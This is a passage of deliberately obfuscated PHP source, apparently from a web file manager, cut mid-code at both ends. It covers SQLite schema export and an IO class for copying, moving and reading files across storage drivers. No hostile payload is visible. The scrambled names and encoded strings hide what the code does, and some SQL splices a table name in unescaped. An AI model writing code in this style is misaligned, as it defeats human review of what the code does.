!$äıâ²‡¡ ? $€áú’êØ[1107] : $€áú’êØ[12], $€áú’êØ[1108], $€áú’êØ[1109] . $ë¯Éªò . $€áú’êØ[11] . ($äıâ²‡¡ ? $€áú’êØ[1110] : $òÛèÌ¡ô[$€áú’êØ[1103]]) . $€áú’êØ[118], $€áú’êØ[1111], $€áú’êØ[118] . $ë¯Éªò . $€áú’êØ[118], $€áú’êØ[1112] . implode($€áú’êØ[1113], $òÛèÌ¡ô[$€áú’êØ[1102]]) . $€áú’êØ[1114]); $™ÛğÑÔÊ[] = implode($€áú’êØ[53], $Ëä¾ÌŠ) . $€áú’êØ[71]; } $âº­ØŸŠ = array(); $´ö’¡ı· = array($€áú’êØ[1115] => $€áú’êØ[1116], $€áú’êØ[1116] => $€áú’êØ[1116], $€áú’êØ[288] => $€áú’êØ[315], $€áú’êØ[287] => $€áú’êØ[315]); foreach ($™¢ÏÅ¼œ as $òÛèÌ¡ô) { $Ëä¾ÌŠ = array($€áú’êØ[118] . $òÛèÌ¡ô[$€áú’êØ[1117]] . $€áú’êØ[118], isset($´ö’¡ı·[$òÛèÌ¡ô[$€áú’êØ[1118]]]) ? $´ö’¡ı·[$òÛèÌ¡ô[$€áú’êØ[1118]]] : $òÛèÌ¡ô[$€áú’êØ[1119]], $òÛèÌ¡ô[$€áú’êØ[1120]] == $€áú’êØ[895] ? $€áú’êØ[1121] : $€áú’êØ[1122], $òÛèÌ¡ô[$€áú’êØ[1117]] == $Ã˜·ú…ä ? $€áú’êØ[1123] : $€áú’êØ[12], $òÛèÌ¡ô[$€áú’êØ[947]] ? strtoupper(str_replace($€áú’êØ[11], $€áú’êØ[12], $òÛèÌ¡ô[$€áú’êØ[947]])) : $€áú’êØ[12]); $âº­ØŸŠ[] = trim(implode($€áú’êØ[53], $Ëä¾ÌŠ)); } $ıì²•Õ• = array($€áú’êØ[1124] . $ë¯Éªò . $€áú’êØ[1125], $€áú’êØ[1126] . $ë¯Éªò . $€áú’êØ[1127], implode($€áú’êØ[50] . PHP_EOL, $âº­ØŸŠ), $€áú’êØ[944]); $œÇú¢ÒÚ = implode(PHP_EOL, array_merge($ıì²•Õ•, $™ÛğÑÔÊ)); if ($£©šÎÚ˜ && $£©šÎÚ˜ == $€áú’êØ[13]) { return $œÇú¢ÒÚ; } $¾ÓşÍì® = array($€áú’êØ[795] => $®È±êï¼, $€áú’êØ[13] => $œÇú¢ÒÚ); return $£©šÎÚ˜ ? $¾ÓşÍì®[$£©šÎÚ˜] : $¾ÓşÍì®; } public function sqlFromSqlite($¦ï§»ä, $Ïóä˜Öñ = '') { $Æ·Éöé =& $_SERVER[­õöî’–]; $Á‹ÑşÇ÷ = $this->model()->db(); $·Òô½€ = "\120\122\101\x47\x4d\101\x20\124\101\x42\114\105\x5f\111\116\x46\x4f\x20\x28\47{$¦ï§»ä}\47\51"; $§Å•‹Î‚ = "\123\x45\x4c\105\103\124\x20\52\x20\x46\x52\x4f\115\40\163\x71\154\151\x74\x65\137\155\x61\163\164\145\x72\40\x57\x48\x45\x52\x45\x20\x74\x62\154\137\x6e\x61\155\145\40\x3d\x20\x27{$¦ï§»ä}\47"; $²’³Ó» = $Á‹ÑşÇ÷->query($·Òô½€); if (empty($²’³Ó»)) { $ÆßŠéşã = array($Æ·Éöé[795] => $Æ·Éöé[12], $Æ·Éöé[13] => $Æ·Éöé[12]); return $Ïóä˜Öñ ? $ÆßŠéşã[$Ïóä˜Öñ] : $ÆßŠéşã; } $šË”Ù¤ß = $Á‹ÑşÇ÷->query($§Å•‹Î‚); $®À„ŸğĞ = $¨……€áø = array(); foreach ($šË”Ù¤ß as $€ñ“º‹) { if ($€ñ“º‹[$Æ·Éöé[33]] == $Æ·Éöé[279]) { $®À„ŸğĞ[] = $€ñ“º‹[$Æ·Éöé[1128]]; } else { $¨……€áø[$€ñ“º‹[$Æ·Éöé[32]]] = $€ñ“º‹[$Æ·Éöé[1128]]; } } $À½ı¶™ = array_merge(array($Æ·Éöé[1124] . $¦ï§»ä . $Æ·Éöé[118]), $®À„ŸğĞ, array_values($¨……€áø)); $À½ı¶™ = implode($Æ·Éöé[71] . PHP_EOL, $À½ı¶™) . $Æ·Éöé[71]; if ($Ïóä˜Öñ && $Ïóä˜Öñ == $Æ·Éöé[13]) { return $À½ı¶™; } $¸¬¼€†Ñ = array(); $©ÒŞú™” = array($Æ·Éöé[1116] => $Æ·Éöé[1129], $Æ·Éöé[315] => $Æ·Éöé[1130]); $ ˆà÷›” = $Æ·Éöé[12]; foreach ($²’³Ó» as $€ñ“º‹) { if ($€ñ“º‹[$Æ·Éöé[57]] == $Æ·Éöé[88]) { $ ˆà÷›” = $€ñ“º‹[$Æ·Éöé[32]]; } $â£ú©ÔÈ = array($Æ·Éöé[385] . $€ñ“º‹[$Æ·Éöé[32]] . $Æ·Éöé[385], isset($©ÒŞú™”[$€ñ“º‹[$Æ·Éöé[33]]]) ? $©ÒŞú™”[$€ñ“º‹[$Æ·Éöé[33]]] : $€ñ“º‹[$Æ·Éöé[33]], $€ñ“º‹[$Æ·Éöé[35]] == $Æ·Éöé[88] ? $Æ·Éöé[1121] : $Æ·Éöé[1131] . $€ñ“º‹[$Æ·Éöé[56]], $€ñ“º‹[$Æ·Éöé[57]] == $Æ·Éöé[88] ? $Æ·Éöé[1132] : $Æ·Éöé[12]); $¸¬¼€†Ñ[] = trim(implode($Æ·Éöé[53], $â£ú©ÔÈ)); } foreach ($¨……€áø as $£½÷şÄ¦ => $•éÙõ›¤) { $“°¹İœ† = str_replace($Æ·Éöé[1133] . $¦ï§»ä . $Æ·Éöé[11], $Æ·Éöé[12], $£½÷şÄ¦); $˜ìâ€Öò = str_replace(array($Æ·Éöé[118], $Æ·Éöé[955]), $Æ·Éöé[385], substr($•éÙõ›¤, stripos($•éÙõ›¤, $Æ·Éöé[260]))); if ($“°¹İœ† == $Æ·Éöé[1110]) { $İÉ½ë¡‹ = $Æ·Éöé[1134] . $ ˆà÷›” . $Æ·Éöé[1135]; } else { $İÉ½ë¡‹ = (stripos($“°¹İœ†, $Æ·Éöé[11]) ? $Æ·Éöé[1136] : $Æ·Éöé[12]) . ($Æ·Éöé[1137] . $“°¹İœ† . $Æ·Éöé[1138] . $˜ìâ€Öò); } $¸¬¼€†Ñ[] = $İÉ½ë¡‹; } $øşˆ’ì = array($Æ·Éöé[1139] . $¦ï§»ä . $Æ·Éöé[1140], $Æ·Éöé[1141] . $¦ï§»ä . $Æ·Éöé[1142], implode($Æ·Éöé[50] . PHP_EOL, $¸¬¼€†Ñ), $Æ·Éöé[1143]); $Ãê‹ó­’ = implode(PHP_EOL, $øşˆ’ì); if ($Ïóä˜Öñ && $Ïóä˜Öñ == $Æ·Éöé[795]) { return $Ãê‹ó­’; } $ÆßŠéşã = array($Æ·Éöé[795] => $Ãê‹ó­’, $Æ·Éöé[13] => $À½ı¶™); return $Ïóä˜Öñ ? $ÆßŠéşã[$Ïóä˜Öñ] : $ÆßŠéşã; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ñ–ø“ÉÒ, $ÎŠ›‚¡è) { $è¤Ï’Œ» =& $_SERVER[­õöî’–]; $î’Û‘Ë = $ÎŠ›‚¡è; $GLOBALS[$è¤Ï’Œ»[1144]] = $è¤Ï’Œ»[1145] . $ñ–ø“ÉÒ; Hook::trigger($è¤Ï’Œ»[1145] . $ñ–ø“ÉÒ . $è¤Ï’Œ»[1146], $î’Û‘Ë); $Ú€Ê „¸ = self::driverMake($ÎŠ›‚¡è[0]); if (!$Ú€Ê „¸) { return !1; } if (method_exists($Ú€Ê „¸, $ñ–ø“ÉÒ)) { $‚ºïõ¦Ø = @call_user_func_array(array($Ú€Ê „¸, $ñ–ø“ÉÒ), $ÎŠ›‚¡è); } else { if (method_exists($Ú€Ê „¸, $è¤Ï’Œ»[1147])) { $‚ºïõ¦Ø = @call_user_func_array(array($Ú€Ê „¸, $ñ–ø“ÉÒ), $ÎŠ›‚¡è); } else { if (method_exists(self, $ñ–ø“ÉÒ)) { $‚ºïõ¦Ø = @call_user_func_array(array(self, $ñ–ø“ÉÒ), $ÎŠ›‚¡è); } else { $‚ºïõ¦Ø = call_user_func_array(array(parent, $ñ–ø“ÉÒ), $ÎŠ›‚¡è); } } } Hook::trigger($è¤Ï’Œ»[1145] . $ñ–ø“ÉÒ . $è¤Ï’Œ»[1148], $î’Û‘Ë, $‚ºïõ¦Ø); return $‚ºïõ¦Ø; } public static function init($ÄĞÅµĞ‚) { return self::driverMake($ÄĞÅµĞ‚); } public static function copy($…Ó¯ÌÜî, $…ò£¾ÉĞ, $Ä†ˆçÅŠ = false, $‘òÇı•æ = false) { return self::copyMoveStart($…Ó¯ÌÜî, $…ò£¾ÉĞ, $Ä†ˆçÅŠ, $_SERVER[­õöî’–][555], $‘òÇı•æ); } public static function move($Û„Ò‚, $É›ûœÀ‡, $¾×ŸšÎŞ = false, $Ê™Ó¹ƒĞ = false) { return self::copyMoveStart($Û„Ò‚, $É›ûœÀ‡, $¾×ŸšÎŞ, $_SERVER[­õöî’–][557], $Ê™Ó¹ƒĞ); } private static function copyMoveStart($Ğ©¡ëÄö, $æÜ­™…›, $»ûè‡Â„, $¡–ÌÂ·ƒ, $ÛµÖÁ¢) { $ôŞœßå =& $_SERVER[­õöî’–]; $¯’ÎØËÜ = array($Ğ©¡ëÄö, $æÜ­™…›, $»ûè‡Â„, $ÛµÖÁ¢); Hook::trigger($ôŞœßå[1145] . $¡–ÌÂ·ƒ . $ôŞœßå[1146], $¯’ÎØËÜ); $®ƒï·› = self::copyMove($Ğ©¡ëÄö, $æÜ­™…›, $»ûè‡Â„, $¡–ÌÂ·ƒ, $ÛµÖÁ¢); Hook::trigger($ôŞœßå[1145] . $¡–ÌÂ·ƒ . $ôŞœßå[1148], $¯’ÎØËÜ, $®ƒï·›); return $®ƒï·›; } public static function saveFile($¢ı®Çßˆ, $³ü³ôàº, $Ü£§ÚÑ = true) { $çúŠ„Ò† =& $_SERVER[­õöî’–]; $á®öªéÇ = self::info($³ü³ôàº); $Ó€í“¼Û = self::driverMake($¢ı®Çßˆ); $›¬¶™³Ã = self::driverMake($³ü³ôàº); $‘åå­ªØ = !1; if ($›¬¶™³Ã->pathParse[$çúŠ„Ò†[1149]]) { $‘åå­ªØ = $›¬¶™³Ã; $ãÛ¶Åğ¿ = $›¬¶™³Ã->pathParse[$çúŠ„Ò†[1149]]; $›¬¶™³Ã = self::driverMake($ãÛ¶Åğ¿); } if ($Ó€í“¼Û->pathParse[$çúŠ„Ò†[1149]]) { $‡Ãæ¾’ = $Ó€í“¼Û->pathParse[$çúŠ„Ò†[1149]]; $Ó€í“¼Û = self::driverMake($‡Ãæ¾’); } $û¶ãÍØï = $›¬¶™³Ã->pathFather($³ü³ôàº); $ûº±Üá­ = !0; if (!$Ü£§ÚÑ && self::driverIsSame($Ó€í“¼Û, $›¬¶™³Ã)) { $ûº±Üá­ = !1; } $ÒıÜÇÚ™ = self::copyFile($Ó€í“¼Û, $¢ı®Çßˆ, $›¬¶™³Ã, $û¶ãÍØï, $á®öªéÇ[$çúŠ„Ò†[32]], $ûº±Üá­); if ($‘åå­ªØ) { $ÒıÜÇÚ™ = $‘åå­ªØ->getPathOuter($ÒıÜÇÚ™); } return $ÒıÜÇÚ™; } private static function copyMove($³ÏÉ¾âì, $ÀØ–ûõß, $ÊÍâØÀ, $üÃ¥ìî¾, $Û§Ææ¼ = false) { $ŒŸôÌÓü =& $_SERVER[­õöî’–]; if (!$³ÏÉ¾âì || $³ÏÉ¾âì == $ŒŸôÌÓü[8] || !$ÀØ–ûõß) { return !1; } ignore_timeout(); $âÎÍÑµ = self::driverMake($³ÏÉ¾âì); $Ö‘éŒ¨· = self::driverMake($ÀØ–ûõß); $×œ¥¦˜» = $üÃ¥ìî¾ == $ŒŸôÌÓü[557]; $åõ‚ñÜâ = !1; if ($Ö‘éŒ¨·->pathParse[$ŒŸôÌÓü[1149]]) { $åõ‚ñÜâ = $Ö‘éŒ¨·; $ÀØ–ûõß = $Ö‘éŒ¨·->pathParse[$ŒŸôÌÓü[1149]]; $Ö‘éŒ¨· = self::driverMake($ÀØ–ûõß); } if ($âÎÍÑµ->pathParse[$ŒŸôÌÓü[1149]]) { $³ÏÉ¾âì = $âÎÍÑµ->pathParse[$ŒŸôÌÓü[1149]]; $âÎÍÑµ = self::driverMake($³ÏÉ¾âì); } self::check($âÎÍÑµ, $³ÏÉ¾âì, $Ö‘éŒ¨·, $ÀØ–ûõß); Hook::trigger($ŒŸôÌÓü[1150], $âÎÍÑµ, $³ÏÉ¾âì, $Ö‘éŒ¨·, $ÀØ–ûõß); $Û‰ÍÀ« = self::driverIsSame($âÎÍÑµ, $Ö‘éŒ¨·); if ($Û‰ÍÀ«) { if ($üÃ¥ìî¾ == $ŒŸôÌÓü[557] && !method_exists($Ö‘éŒ¨·, $ŒŸôÌÓü[1151]) && trim($ÀØ–ûõß, $ŒŸôÌÓü[8]) == trim($Ö‘éŒ¨·->pathFather($³ÏÉ¾âì), $ŒŸôÌÓü[8])) { if ($âÎÍÑµ->pathThis($³ÏÉ¾âì) != $Û§Ææ¼ && !$âÎÍÑµ->isTypeObject()) { return $âÎÍÑµ->rename($³ÏÉ¾âì, $Û§Ææ¼); } return $Ö‘éŒ¨·->getPathOuter($³ÏÉ¾âì); } if (method_exists($Ö‘éŒ¨·, $üÃ¥ìî¾)) { return $Ö‘éŒ¨·->{$üÃ¥ìî¾}($³ÏÉ¾âì, $ÀØ–ûõß, $ÊÍâØÀ, $Û§Ææ¼); } } if ($Û‰ÍÀ« && $üÃ¥ìî¾ == $ŒŸôÌÓü[557] && $Ö‘éŒ¨·->getType() == $ŒŸôÌÓü[106]) { $Ûª¿Ñğ = $Ö‘éŒ¨·->movePath($³ÏÉ¾âì, $ÀØ–ûõß, $Û§Ææ¼); if ($Ûª¿Ñğ) { return $Ûª¿Ñğ; } } $ßôÔ¦Ò = $âÎÍÑµ->isFile($³ÏÉ¾âì); if (!$ßôÔ¦Ò && $Ö‘éŒ¨·->getType() == $ŒŸôÌÓü[749] && $âÎÍÑµ->getType() == $ŒŸôÌÓü[106]) { $Ûª¿Ñğ = $Ö‘éŒ¨·->copyFolderFromIO($âÎÍÑµ, $³ÏÉ¾âì, $ÀØ–ûõß, $ÊÍâØÀ, $×œ¥¦˜», $Û§Ææ¼); } else { $Ûª¿Ñğ = self::copyPath($âÎÍÑµ, $³ÏÉ¾âì, $Ö‘éŒ¨·, $ÀØ–ûõß, $ÊÍâØÀ, $×œ¥¦˜», $ßôÔ¦Ò, $Û§Ææ¼); } if ($Ûª¿Ñğ && $×œ¥¦˜») { $âÎÍÑµ->remove($³ÏÉ¾âì); } if ($åõ‚ñÜâ) { $Ûª¿Ñğ = $åõ‚ñÜâ->getPathOuter($Ûª¿Ñğ); } return $Ûª¿Ñğ; } private static function check($ø¬´›ª, $Ó¿ß™§”, $ŒÌÏØÎÏ, &$¯–®áºÕ) { $î¢»’ëé =& $_SERVER[­õöî’–]; if (self::driverIsSame($ø¬´›ª, $ŒÌÏØÎÏ) && $ø¬´›ª->isFolder($Ó¿ß™§”) && $ø¬´›ª->isParentOf($Ó¿ß™§”, $¯–®áºÕ)) { show_json(LNG($î¢»’ëé[1152]), !1); } if (!$ø¬´›ª->exist($Ó¿ß™§”)) { show_json(LNG($î¢»’ëé[105]), !1); } } private static function copyPath($Ûá»ø¬ª, $±½æêó, $·şôª«Ä, $›ÄÏÛ, $±ÅÛ·Ï¼, $à¹ÖÀ«ñ, $ó÷¡ß¥Ÿ, $—£…ö®Ì = false, $úËê¶ùÂ = true) { $õÉòÅÔÚ =& $_SERVER[­õöî’–]; $§°œ½Ûı = empty($—£…ö®Ì) && $—£…ö®Ì !== $õÉòÅÔÚ[197] ? $Ûá»ø¬ª->pathThis($±½æêó) : $—£…ö®Ì; if ($±ÅÛ·Ï¼) { $ÓÄØÒÑƒ = $·şôª«Ä->fileNameExist($›ÄÏÛ, $§°œ½Ûı); $Í™éãÄô = $§°œ½Ûı; $§°œ½Ûı = $·şôª«Ä->fileNameAuto($›ÄÏÛ, $§°œ½Ûı, $±ÅÛ·Ï¼, !$ó÷¡ß¥Ÿ); if (!$ÓÄØÒÑƒ || $Í™éãÄô != $§°œ½Ûı) { $±ÅÛ·Ï¼ = !1; } if ($úËê¶ùÂ && !$±ÅÛ·Ï¼) { $·şôª«Ä->_data[$õÉòÅÔÚ[1153]] = !0; } } if ($ó÷¡ß¥Ÿ) { return self::copyFile($Ûá»ø¬ª, $±½æêó, $·şôª«Ä, $›ÄÏÛ, $§°œ½Ûı, $à¹ÖÀ«ñ); } if ($±ÅÛ·Ï¼ == REPEAT_RENAME_FOLDER) { $±ÅÛ·Ï¼ = !1; } $š‘ëÏ÷ü = rtrim($›ÄÏÛ, $õÉòÅÔÚ[8]) . $õÉòÅÔÚ[8] . $§°œ½Ûı; $‘¬ÄÂğ¸ = $·şôª«Ä->mkdir($·şôª«Ä->getPath($š‘ëÏ÷ü), $±ÅÛ·Ï¼); $›ÄÏÛ = $·şôª«Ä->getPathInner($‘¬ÄÂğ¸); $ÃÏ‚ì“¬ = $Ûá»ø¬ª->listPath($±½æêó, !0); $ÃÏ‚ì“¬ = is_array($ÃÏ‚ì“¬) ? $ÃÏ‚ì“¬ : array($õÉòÅÔÚ[83] => array(), $õÉòÅÔÚ[82] => array()); $ˆˆ¢„¿÷ = array_merge($ÃÏ‚ì“¬[$õÉòÅÔÚ[83]], $ÃÏ‚ì“¬[$õÉòÅÔÚ[82]]); foreach ($ˆˆ¢„¿÷ as $®ë¡í) { $ë‰† ° = $®ë¡í[$õÉòÅÔÚ[33]] == $õÉòÅÔÚ[199]; $±½æêó = $Ûá»ø¬ª->getPathInner($®ë¡í[$õÉòÅÔÚ[84]]); $ø˜ü…Ñ² = self::copyPath($Ûá»ø¬ª, $±½æêó, $·şôª«Ä, $›ÄÏÛ, $±ÅÛ·Ï¼, $à¹ÖÀ«ñ, $ë‰† °, !1, !1); if (!$ø˜ü…Ñ²) { IO::errorTips($õÉòÅÔÚ[1154] . $±½æêó . $õÉòÅÔÚ[70] . $›ÄÏÛ); } } self::copyMoveKeepInfo($Ûá»ø¬ª, $±½æêó, $‘¬ÄÂğ¸); return $‘¬ÄÂğ¸; } private static function copyFile($ŞİÛ¬Í, $ø³¦‘ƒ›, $Ù®Á¹Ù“, $ùÄµ¿ÛŒ, $åûå­³Ã, $¾Î…†¼ı) { $£İÕÎè‰ =& $_SERVER[­õöî’–]; $ùÄµ¿ÛŒ = $Ù®Á¹Ù“->getPath(rtrim($ùÄµ¿ÛŒ, $£İÕÎè‰[8]) . $£İÕÎè‰[8] . $åûå­³Ã); $âçığïà = $£İÕÎè‰[1155] . time() . rand_string(5); Hook::trigger($£İÕÎè‰[1156], $ŞİÛ¬Í, $ø³¦‘ƒ›, $Ù®Á¹Ù“, $ùÄµ¿ÛŒ, $åûå­³Ã, $âçığïà); if (self::driverIsSame($ŞİÛ¬Í, $Ù®Á¹Ù“)) { if ($¾Î…†¼ı) { $¦½áÄ„ = $Ù®Á¹Ù“->moveFile($ø³¦‘ƒ›, $ùÄµ¿ÛŒ); } else { $¦½áÄ„ = $Ù®Á¹Ù“->copyFile($ø³¦‘ƒ›, $ùÄµ¿ÛŒ); } Hook::trigger($£İÕÎè‰[1157], $ŞİÛ¬Í, $ø³¦‘ƒ›, $Ù®Á¹Ù“, $ùÄµ¿ÛŒ, $åûå­³Ã, $¦½áÄ„); self::copyMoveKeepInfo($ŞİÛ¬Í, $ø³¦‘ƒ›, $¦½áÄ„); return $¦½áÄ„; } $ ĞÇå´ö = TEMP_FILES; if ($GLOBALS[$£İÕÎè‰[6]][$£İÕÎè‰[89]][$£İÕÎè‰[787]]) { $ ĞÇå´ö = $GLOBALS[$£İÕÎè‰[6]][$£İÕÎè‰[89]][$£İÕÎè‰[787]]; } $ÒƒßÇñŸ = $ ĞÇå´ö; mk_dir($ÒƒßÇñŸ); $çÌÀüñ = $ÒƒßÇñŸ . $âçığïà; $Ç³õ˜’ = $çÌÀüñ; $çÌÀüñ = $ŞİÛ¬Í->download($ø³¦‘ƒ›, $çÌÀüñ); $çÌÀüñ = $ŞİÛ¬Í->iconvApp($çÌÀüñ); if (substr($çÌÀüñ, strlen($ ĞÇå´ö)) == $ ĞÇå´ö) { $¾Î…†¼ı = !0; } $¦½áÄ„ = $Ù®Á¹Ù“->upload($ùÄµ¿ÛŒ, $çÌÀüñ, $¾Î…†¼ı); self::remove($Ç³õ˜’); Hook::trigger($£İÕÎè‰[1157], $ŞİÛ¬Í, $ø³¦‘ƒ›, $Ù®Á¹Ù“, $ùÄµ¿ÛŒ, $åûå­³Ã, $¦½áÄ„); self::copyMoveKeepInfo($ŞİÛ¬Í, $ø³¦‘ƒ›, $¦½áÄ„); return $¦½áÄ„; } private static function copyMoveKeepInfo($şİø»µ¨, $çÃÚË™‡, $†â¿ÜÄœ) { if (!$†â¿ÜÄœ) { return; } $äü©Ëœœ = $şİø»µ¨->info($çÃÚË™‡); if (!is_array($äü©Ëœœ)) { return; } IO::setModifyTime($†â¿ÜÄœ, $äü©Ëœœ[$_SERVER[­õöî’–][85]]); } public static function pathFather($‹…Ò”›) { $ğ°îä = IO::init($‹…Ò”›); $Â”ª½ß = $ğ°îä->pathFather($ğ°îä->path); return $ğ°îä->getPathOuter($Â”ª½ß); } public static function fileOut($„ÕÏ«§«, $¼á­„ÀŞ = false, $ÓÛ¨ í = false, $ñ¾ÕÆµ— = '') { $éÛ €†™ = self::driverMake($„ÕÏ«§«); if ($éÛ €†™->isFileOutServer()) { return $éÛ €†™->fileOutServer($„ÕÏ«§«, $¼á­„ÀŞ, $ÓÛ¨ í, $ñ¾ÕÆµ—); } return $éÛ €†™->fileOut($„ÕÏ«§«, $¼á­„ÀŞ, $ÓÛ¨ í, $ñ¾ÕÆµ—); } public static function fileOutImage($É¸¸ŒæÈ, $üü¨¹à¶ = 250) { $ƒ­³« = array(250, 600, 1200, 2000, 3000, 5000); for ($™ê¢í¿’ = 0; $™ê¢í¿’ < count($ƒ­³«); $™ê¢í¿’++) { if ($™ê¢í¿’ == 0 && $üü¨¹à¶ <= $ƒ­³«[$™ê¢í¿’]) { $üü¨¹à¶ = $ƒ­³«[$™ê¢í¿’]; break; } else { if ($üü¨¹à¶ > $ƒ­³«[$™ê¢í¿’ - 1] && $üü¨¹à¶ <= $ƒ­³«[$™ê¢í¿’]) { $üü¨¹à¶ = $ƒ­³«[$™ê¢í¿’]; break; } else { if ($™ê¢í¿’ == count($ƒ­³«) - 1 && $üü¨¹à¶ > $ƒ­³«[$™ê¢í¿’]) { $üü¨¹à¶ = $ƒ­³«[$™ê¢í¿’]; break; } } } } $§øÙä‹ = self::driverMake($É¸¸ŒæÈ); if ($§øÙä‹->isFileOutServer()) { return $§øÙä‹->fileOutImageServer($É¸¸ŒæÈ, $üü¨¹à¶); } return $§øÙä‹->fileOutImage($É¸¸ŒæÈ, $üü¨¹à¶); } private static function driverIsSame($Ë«Ğ¼Ö÷, $ô‡äù¥) { $ÜøÛŸÊª =& $_SERVER[­õöî’–]; $‚°ÆÕêÄ = $Ë«Ğ¼Ö÷->getType(); $ÉŒˆÛ€ = $ô‡äù¥->getType(); if ($‚°ÆÕêÄ != $ÉŒˆÛ€) { return !1; } if ($‚°ÆÕêÄ == $ÜøÛŸÊª[749]) { return !0; } if ($‚°ÆÕêÄ == $ÜøÛŸÊª[106]) { return !0; } if ($Ë«Ğ¼Ö÷->pathDriver == $ô‡äù¥->pathDriver) { return !0; } return !1; } public static function copyUpdate($õ°æ üŒ, $±ÑÄ¬º©) { $ÎµÆĞ‚Ú =& $_SERVER[­õöî’–]; if (!IO::exist($õ°æ üŒ)) { return !1; } if (!IO::exist($±ÑÄ¬º©)) { IO::mkdir($±ÑÄ¬º©); } $ÊÛ·¬ê = self::_listAll($õ°æ üŒ); $õŞÈ¦ª = self::_listAll($±ÑÄ¬º©); $¬çøÌµÇ = array(); $‡Íéïõ™ = array(); foreach ($ÊÛ·¬ê as $£Îˆ»’£ => $İÙ›”×•) { if (isset($õŞÈ¦ª[$£Îˆ»’£])) { if ($İÙ›”×•[$ÎµÆĞ‚Ú[75]] == 1) { continue; } if ($õŞÈ¦ª[$£Îˆ»’£][$ÎµÆĞ‚Ú[76]] == $İÙ›”×•[$ÎµÆĞ‚Ú[76]]) { continue; } } if ($İÙ›”×•[$ÎµÆĞ‚Ú[75]] == 1) { $‡Íéïõ™[] = $±ÑÄ¬º© . $ÎµÆĞ‚Ú[8] . $£Îˆ»’£; continue; } $£Š‹¤µ™ = strstr(trim($£Îˆ»’£, $ÎµÆĞ‚Ú[8]), $ÎµÆĞ‚Ú[8]) ? get_path_father($£Îˆ»’£) : $ÎµÆĞ‚Ú[12]; $¬çøÌµÇ[] = array($ÎµÆĞ‚Ú[1158] => $İÙ›”×•[$ÎµÆĞ‚Ú[84]], $ÎµÆĞ‚Ú[1159] => rtrim($±ÑÄ¬º©, $ÎµÆĞ‚Ú[8]) . $ÎµÆĞ‚Ú[8] . $£Š‹¤µ™, $ÎµÆĞ‚Ú[1160] => $İÙ›”×•); } $ÍÇ‰Êû = array($ÎµÆĞ‚Ú[199] => $¬çøÌµÇ, $ÎµÆĞ‚Ú[75] => $‡Íéïõ™); Hook::trigger($ÎµÆĞ‚Ú[1161], $õ°æ üŒ, $±ÑÄ¬º©, $ÍÇ‰Êû); foreach ($‡Íéïõ™ as $İÙ›”×•) { IO::mkdir($İÙ›”×•); } foreach ($¬çøÌµÇ as $İÙ›”×•) { IO::copy($İÙ›”×•[$ÎµÆĞ‚Ú[1158]], $İÙ›”×•[$ÎµÆĞ‚Ú[1159]], REPEAT_REPLACE); } } private static function _listAll($ÆİÁê¯İ) { $¿˜†Ó =& $_SERVER[­õöî’–]; $ÆİÁê¯İ = KodIO::clear($ÆİÁê¯İ); $Ö…ÂÚ” = IO::listAll($ÆİÁê¯İ); foreach ($Ö…ÂÚ” as &$Øïœçö) { $ĞÈÅÖ… = substr($Øïœçö[$¿˜†Ó[84]], strlen($ÆİÁê¯İ)); $Øïœçö[$¿˜†Ó[1162]] = trim($ĞÈÅÖ…, $¿˜†Ó[8]); } unset($Øïœçö); return array_to_keyvalue($Ö…ÂÚ”, $¿˜†Ó[1162]); } public static function fileSubstr($í€ëÛ×, $Şä«ß»“, $±‡¡ÍÇÕ = false) { $ÁÉÈ“ˆï =& $_SERVER[­õöî’–]; $‘ÌÓÓù¶ = self::driverMake($í€ëÛ×); $ò§øÒó£ = $‘ÌÓÓù¶->size($í€ëÛ×); $ƒ‘Á¦‡Ê = $Şä«ß»“; $©Íœƒ¤ö = $±‡¡ÍÇÕ; if ($Şä«ß»“ < 0) { $Şä«ß»“ = $ò§øÒó£ + $Şä«ß»“; } if ($±‡¡ÍÇÕ === !1) { $±‡¡ÍÇÕ = $ò§øÒó£ - $Şä«ß»“; } if ($Şä«ß»“ + $±‡¡ÍÇÕ > $ò§øÒó£) { $±‡¡ÍÇÕ = $ò§øÒó£ - $Şä«ß»“; } if (!$ò§øÒó£ && $‘ÌÓÓù¶->getType() == $ÁÉÈ“ˆï[106] && !$‘ÌÓÓù¶->exist($í€ëÛ×)) { $‰ÊíÉóŞ = get_path_this($í€ëÛ×); $Ò±Şäğ = parse_url_query($‰ÊíÉóŞ); if (is_array($Ò±Şäğ) && isset($Ò±Şäğ[$ÁÉÈ“ˆï[32]])) { $‰ÊíÉóŞ = urldecode($Ò±Şäğ[$ÁÉÈ“ˆï[32]]); } throw new Exception($ÁÉÈ“ˆï[1163] . LNG($ÁÉÈ“ˆï[1164]) . $ÁÉÈ“ˆï[964] . clear_html($‰ÊíÉóŞ) . $ÁÉÈ“ˆï[12]); } if ($±‡¡ÍÇÕ <= 0) { return $ÁÉÈ“ˆï[12]; } if ($Şä«ß»“ < 0 || $Şä«ß»“ >= $ò§øÒó£ || $±‡¡ÍÇÕ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\122\145\x61\144\40\x65\x72\x72\x6f\162\41\x20\163\x74\x61\162\164\x3d{$Şä«ß»“}\73\x6c\x65\x6e\x67\164\150\x3d{$±‡¡ÍÇÕ}\x3b\40\163\151\172\145\x3d{$ò§øÒó£}\73"); } $ÆÚµ¬ªõ = $‘ÌÓÓù¶->fileSubstr($í€ëÛ×, $Şä«ß»“, $±‡¡ÍÇÕ); if (!$ÆÚµ¬ªõ && $±‡¡ÍÇÕ && isset($GLOBALS[$ÁÉÈ“ˆï[1165]])) { throw new Exception($GLOBALS[$ÁÉÈ“ˆï[1165]][$ÁÉÈ“ˆï[1166]]); } return $ÆÚµ¬ªõ; } private static function driverMake(&$Û£Á¨×€) { $Í›™ê‹‹ =& $_SERVER[­õöî’–]; $Šñ©¬Ó¹ = KodIO::parse($Û£Á¨×€); if (!self::$driverListSystem) { $ƒıÍºïÉ = Model($Í›™ê‹‹[758])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ƒıÍºïÉ, $Í›™ê‹‹[399]); } if ($Šñ©¬Ó¹[$Í›™ê‹‹[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Šñ©¬Ó¹[$Í›™ê‹‹[399]]]) { return !1; } $Û£Á¨×€ = $Šñ©¬Ó¹[$Í›™ê‹‹[1167]]; $£Üí¬òÔ = self::driverGet($Šñ©¬Ó¹, $Û£Á¨×€); return $£Üí¬òÔ; } private static function driverGet($Á°îÑùµ, &$¤ë‹ƒ®) { $Ã½§Ó‡„ =& $_SERVER[­õöî’–]; $‹íñ£ = 